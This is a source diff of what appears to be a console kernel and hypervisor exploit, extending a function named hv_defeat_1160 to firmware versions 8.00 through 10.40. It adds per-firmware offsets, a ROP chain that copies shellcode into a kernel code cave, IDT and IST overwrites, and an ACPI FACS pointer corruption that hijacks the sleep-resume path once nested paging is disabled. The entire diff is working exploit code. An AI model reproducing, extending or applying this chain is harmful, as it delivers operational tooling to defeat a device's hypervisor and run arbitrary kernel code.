@@ -23,6 +23,18 @@
  * wake blob from its prepare_resume() alias into the kernel code cave.
  */
 
+#define FW_0800_RAW 0x08000044U
+#define FW_0820_RAW 0x08200006U
+#define FW_0840_RAW 0x08400005U
+#define FW_0860_RAW 0x08600004U
+#define FW_0900_RAW 0x09000045U
+#define FW_0920_RAW 0x09200005U
+#define FW_0940_RAW 0x09400008U
+#define FW_0960_RAW 0x09600004U
+#define FW_1000_RAW 0x10000046U
+#define FW_1001_RAW 0x10010000U
+#define FW_1020_RAW 0x10200006U
+#define FW_1040_RAW 0x10400007U
 #define FW_1060_RAW 0x10600006U
 #define FW_1100_RAW 0x11000043U
 #define FW_1120_RAW 0x11200005U
@@ -71,8 +83,12 @@
 #define STATE_ARMED 0x493950524F444152ULL /* "I9PRODAR" */
 #define CHAIN_MARK 0x434841494E2D3031ULL  /* "CHAIN-01" */
 
-#define KTEXT_1160_END 0xD30000ULL
-#define CODE_CAVE_CAPACITY (KTEXT_1160_END - 0xD2B000ULL)
+/* 8.xx/9.xx caves are >= 0xD000 and carry their own wake blob (0x5E78);
+ * 10.xx/11.xx share the <= 0x5000 blob. */
+#define CODE_CAVE_CAPACITY_89 0x8000ULL
+#define CODE_CAVE_CAPACITY_1011 0x5000ULL
+#define code_cave_capacity() (fw >= 0x0800 && fw < 0x1000 ? CODE_CAVE_CAPACITY_89 \
+                                                         : CODE_CAVE_CAPACITY_1011)
 
 _Static_assert(CAVE_ARM_OFF + 0x400 <= CAVE_FALLBACKS_OFF,
                "DR0 arm overlaps fallbacks");
@@ -126,6 +142,18 @@ static int offsets_present(void) {
   uint32_t expected_raw = 0;
 
   switch (fw) {
+  case 0x0800: expected_raw = FW_0800_RAW; break;
+  case 0x0820: expected_raw = FW_0820_RAW; break;
+  case 0x0840: expected_raw = FW_0840_RAW; break;
+  case 0x0860: expected_raw = FW_0860_RAW; break;
+  case 0x0900: expected_raw = FW_0900_RAW; break;
+  case 0x0920: expected_raw = FW_0920_RAW; break;
+  case 0x0940: expected_raw = FW_0940_RAW; break;
+  case 0x0960: expected_raw = FW_0960_RAW; break;
+  case 0x1000: expected_raw = FW_1000_RAW; break;
+  case 0x1001: expected_raw = FW_1001_RAW; break;
+  case 0x1020: expected_raw = FW_1020_RAW; break;
+  case 0x1040: expected_raw = FW_1040_RAW; break;
   case 0x1060: expected_raw = FW_1060_RAW; break;
   case 0x1100: expected_raw = FW_1100_RAW; break;
   case 0x1120: expected_raw = FW_1120_RAW; break;
@@ -135,9 +163,28 @@ static int offsets_present(void) {
   }
   if (kernel_get_fw_version() != expected_raw)
     return 0;
-  /* HV code cave PA is constant across all supported firmwares. */
+  /* HV code cave PA is constant across all supported firmwares; the VMEXIT
+   * handler is per firmware (audit F3). */
   if (env_offset.HV_CODE_CAVE_PA != 0x62806F00ULL)
     return 0;
+  if (fw >= 0x0800 && fw < 0x0900) {
+    if (env_offset.HV_HANDLE_VMEXIT_PA != 0x628457AEULL)
+      return 0;
+  } else if (fw == 0x0900 || fw == 0x0920 || fw == 0x0940) {
+    if (env_offset.HV_HANDLE_VMEXIT_PA != 0x6284709EULL)
+      return 0;
+  } else if (fw == 0x0960) {
+    if (env_offset.HV_HANDLE_VMEXIT_PA != 0x628470DEULL)
+      return 0;
+  } else if (fw >= 0x1000 && fw < 0x1050) {
+    if (env_offset.HV_HANDLE_VMEXIT_PA != 0x62847488ULL)
+      return 0;
+  } else if (fw == 0x1060) {
+    if (env_offset.HV_HANDLE_VMEXIT_PA != 0x628474A8ULL)
+      return 0;
+  } else if (env_offset.HV_HANDLE_VMEXIT_PA != 0x62847551ULL) {
+    return 0;
+  }
   for (size_t i = 0; i < sizeof(required) / sizeof(required[0]); i++)
     if (required[i] == 0)
       return 0;
@@ -186,7 +233,7 @@ static int walk_page(uint64_t va, int clear_nx) {
 }
 
 static int validate_wake_cave(size_t shellcode_len) {
-  if (shellcode_len == 0 || shellcode_len > CODE_CAVE_CAPACITY)
+  if (shellcode_len == 0 || shellcode_len > code_cave_capacity())
     return -1;
 
   /*
@@ -507,13 +554,21 @@ static int arm_startup_carrier(uint64_t resume_cave) {
   return 0;
 }
 
-static int build_sx_rop(uint64_t ist) {
-  /* Shellcode is pre-copied to KERNEL_CODE_CAVE by hv_defeat_1160 before
-   * sleep. On 10.xx the kernel_cave_shellcode alias is in private SYSCORE
-   * page tables (below the 10.xx DMAP base), so a memcpy from that VA faults
-   * on the kernel CR3 active at S3 resume. Pre-copy avoids the dependency. */
-  uint64_t target = kg(env_offset.KERNEL_CODE_CAVE);
-  kwrite(ist + 0x1000, &target, sizeof(target));
+static int build_sx_rop(uint64_t ist, size_t shellcode_len) {
+  /* 11.00-11.60 and 10.60: the hardware-proven Sonic transfer. The copy runs
+   * inside the #SX handler after break_hv cleared NP_ENABLE, which is the only
+   * point where a .text write is safe on 10.60 (00:34:31 NPF). */
+  uint64_t rop[16] = {0};
+  uint64_t *p = rop;
+  *p++ = kg(env_offset.GAD_POP_RDI_RET);
+  *p++ = kg(env_offset.KERNEL_CODE_CAVE);
+  *p++ = kg(env_offset.GAD_POP_RSI_RET);
+  *p++ = kernel_cave_shellcode;
+  *p++ = kg(env_offset.GAD_POP_RDX_RET);
+  *p++ = shellcode_len;
+  *p++ = kg(env_offset.FUN_MEMCPY);
+  *p++ = kg(env_offset.KERNEL_CODE_CAVE);
+  kwrite(ist + 0x1000, rop, (size_t)((uint8_t *)p - (uint8_t *)rop));
   return 0;
 }
 
@@ -555,6 +610,8 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
     notify("11.60 could not pin scheduler CPU 15 / TSS slot zero\n");
     return -1;
   }
+  if (fw >= 0x1000 && fw < 0x1100)
+    notify("10.xx pinned to CPU 15 (TSS slot zero)\n");
 
   if (walk_page(dmap + AP_PAYLOAD_PAGE, 1)) {
     notify("11.60 startup-AP carrier page is not executable\n");
@@ -565,13 +622,10 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
    * staging took it and checked it, and the page under it, before it wrote
    * anything.  See take_sx_stack_page_1160. */
   sx_ist = pa_to_dmap(sx_stack_page_1160());
-  if (kernel_copyin(shellcode_kernel, kg(env_offset.KERNEL_CODE_CAVE),
-                    shellcode_kernel_len)) {
-    notify("11.60 could not pre-copy shellcode to cave\n");
+  if (sx_ist == dmap || build_sx_rop(sx_ist, shellcode_kernel_len))
     return -1;
-  }
-  if (sx_ist == dmap || build_sx_rop(sx_ist))
-    return -1;
+  if (fw >= 0x1000 && fw < 0x1100)
+    notify("10.xx #SX ROP chain built\n");
 
   resume_cave = kg(env_offset.DATA_CAVE);
   if (kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != 0) {
@@ -586,6 +640,8 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
     notify("11.60 startup-AP carrier refused to arm (%d)\n", rc);
     return -1;
   }
+  if (fw >= 0x1000 && fw < 0x1100)
+    notify("10.xx startup-AP carrier armed\n");
 
   kwrite64(kg(env_offset.COMMON_TSS) + TSS_IST(7), sx_ist + 0x1000);
   /* #GP and #SX use a six-qword IST frame, so the final pivot
@@ -594,13 +650,17 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
    * which has no error code. */
   setidt(13, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
   setidt(30, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
+  /* 8.x/9.x: the facs-8 mangled pointer is a canonical user-space address, so
+   * the resume fault is a #PF (vector 14), not the #GP 10.x/11.x take. */
+  if (fw >= 0x0800 && fw < 0x1000)
+    setidt(14, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
+  if (fw >= 0x1000 && fw < 0x1100)
+    notify("10.xx IST7 + IDT #GP/#SX set\n");
 
-  if (env_offset.HOOK_ACPI_WAKEUP_MACHDEP) {
-    /* 10.60: A53 firmware validates Special Wake and rejects a corrupted
-     * FACS pointer, forcing a cold reboot before our ROP can run.  Patch
-     * the call to AcpiSetFirmwareWakingVector in acpi_wakeup_machdep's
-     * resume tail to jump directly to the kernel code cave instead.
-     * FACS is left intact so the A53 accepts the wake normally. */
+#if defined(TEN60_CALL_HOOK)
+  if (fw == 0x1060 && env_offset.HOOK_ACPI_WAKEUP_MACHDEP) {
+    /* Debug only: this .text write triggers the 10.60 NPF that terminates the
+     * hypervisor before suspend (00:34:31). Kept for A/B runs. */
     uint8_t patched_call[5];
     patched_call[0] = 0xE8;
     int64_t rel = (int64_t)(ktext + env_offset.KERNEL_CODE_CAVE) -
@@ -608,12 +668,23 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
     *((int32_t *)&patched_call[1]) = (int32_t)rel;
     kwrite(ktext + env_offset.HOOK_ACPI_WAKEUP_MACHDEP, patched_call,
            sizeof(patched_call));
-  } else {
-    /* As on 13.60, corrupt the FACS pointer so the stock wake path reaches
-     * the #GP/#SX copy-and-transfer chain after NPT has been disabled. */
+    notify("10.60 acpi_wakeup_machdep CALL hook patched at ktext+0x%llx\n",
+           (unsigned long long)env_offset.HOOK_ACPI_WAKEUP_MACHDEP);
+  } else
+#endif
+  {
+    /* FACS trigger. 10.x/11.x are proven with facs-8 (#GP). 8.x/9.x mangle to
+     * a canonical unmapped address instead, so they take the deterministic
+     * 13.xx form: facs-0xC lands the store in the LOW dword and the pointer
+     * becomes 0xFFFFFFFF_<wakePA>, which always faults at 0xFFFFFFFF000xxxxx
+     * (below the kernel image) as a #PF that we catch on vector 14. */
+    /* facs-8 is the only form that suspends cleanly on 9.00. The mangled
+     * pointer is dereferenced after break_hv at resume and faults as a #PF
+     * (Fatal trap 12 was observed without a handler), so 8.x/9.x install the
+     * same IST7 delivery on vector 14 below. */
     kwrite64(kg(env_offset.ACPIGBL_FACS), kg(env_offset.ACPIGBL_FACS) - 8);
   }
 
-  notify("11.60 Linux wake chain armed\n");
+  notify("%04x Linux wake chain armed\n", fw);
   return 0;
 }
